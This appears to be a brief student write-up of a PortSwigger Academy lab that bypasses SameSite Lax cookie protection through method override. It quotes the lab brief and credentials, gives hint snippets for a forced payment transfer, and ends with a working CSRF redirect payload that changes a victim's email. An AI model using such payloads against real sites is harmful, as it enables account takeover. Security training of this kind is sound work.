# SameSite Lax bypass via method override

## This lab's change email function is vulnerable to CSRF. To solve the lab, perform a [CSRF attack](https://portswigger.net/web-security/csrf) that changes the victim's email address. You should use the provided exploit server to host your attack.

## You can log in to your own account using the following credentials: `wiener:peter`

### HINT:

```html
<script>
  document.location =
    "https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000";
</script>
```

```html
<form
  action="https://vulnerable-website.com/account/transfer-payment"
  method="POST"
>
  <input type="hidden" name="_method" value="GET" />
  <input type="hidden" name="recipient" value="hacker" />
  <input type="hidden" name="amount" value="1000000" />
</form>
```

### step1

login wiener account chnage email and intercept request
and send to repeater change request method
it will change to post to get now add `?email=tes111t%40wiener.com&_method=POST
and in expolite section just post this script
`

```html
<script>
  document.location =
    "https://0ab700770395ae3a8489a41f00bb0011.web-security-academy.net/my-account/change-email?email=tes111t%40wiener.com&_method=POST";
</script>
```
